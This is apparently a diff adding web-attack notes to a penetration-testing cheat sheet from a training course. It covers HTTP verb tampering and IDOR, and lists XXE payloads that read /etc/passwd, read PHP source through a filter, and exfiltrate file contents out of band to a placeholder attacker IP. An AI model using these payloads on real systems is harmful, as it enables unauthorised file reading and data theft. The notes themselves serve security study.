@@ -643,6 +643,42 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 ```
 ##### Attacking Web Attacks
 ```
+#HTTP Method - VERB Tampering
+
+change GET for POST, HEAD, OPTIONS, PATCH, PUT to see how the server reacts
+in Caido or Burp Suite change from GET to POST using built in feature
+
+-X OPTIONS set HTTP method with Curl
+
+#IDOR
+In URL parameters & APIs
+In AJAX Calls
+By understanding reference hashing/encoding
+By comparing user roles
+
+#Command Description
+md5sum MD5 hash a string
+base64 Base64 encode a string
+
+#XXE
+<!ENTITY xxe SYSTEM "http://localhost/email.dtd"> Define External Entity to a
+URL
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> Define External Entity to a file
+path
+<!ENTITY company SYSTEM
+"php://filter/convert.base64-
+encode/resource=index.php">
+Read PHP source code with
+base64 encode filter
+<!ENTITY % error "<!ENTITY content SYSTEM
+'%nonExistingEntity;/%file;'>">
+Reading a file through a PHP
+error
+<!ENTITY % oob "<!ENTITY content SYSTEM
+'http://OUR_IP:8000/?content=%file;'>">
+Reading a file OOB
+exfiltration
+
 ```
 
 
